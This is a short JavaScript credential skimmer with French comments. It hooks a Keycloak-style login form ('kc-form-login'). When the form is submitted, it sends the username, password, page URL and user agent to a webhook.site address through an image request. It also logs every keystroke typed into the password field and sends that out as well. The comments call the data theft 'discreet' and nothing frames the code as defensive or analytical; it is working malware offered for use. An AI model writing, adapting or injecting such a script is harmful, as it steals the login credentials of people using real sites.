(function() {
  if (window.__vault_jok3r_loaded__) return;
  window.__vault_jok3r_loaded__ = true;

  // ✅ Ton Webhook ici
  const webhook = 'https://webhook.site/8da442bc-35ab-4621-b309-0af722556df8';

  function exfiltrate(username, password) {
    const img = new Image();
    img.src = `${webhook}?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&url=${encodeURIComponent(window.location.href)}&ua=${encodeURIComponent(navigator.userAgent)}`;
  }

  function main() {
    const form = document.getElementById('kc-form-login');
    const usernameField = document.getElementById('username');
    const passwordField = document.getElementById('password');

    if (!form || !usernameField || !passwordField) {
      // 🕐 Retry après un délai (DOM pas encore prêt ?)
      setTimeout(main, 500);
      return;
    }

    // ✅ Intercepte le submit (formulaire envoyé)
    form.addEventListener('submit', function(e) {
      const username = usernameField.value;
      const password = passwordField.value;

      // ✅ Exfiltration discrète
      exfiltrate(username, password);
    });

    // ✅ Keylogger discret (optionnel)
    passwordField.addEventListener('input', () => {
      exfiltrate('', passwordField.value);
    });
  }

  // ✅ Lance l'écouteur
  main();

})();
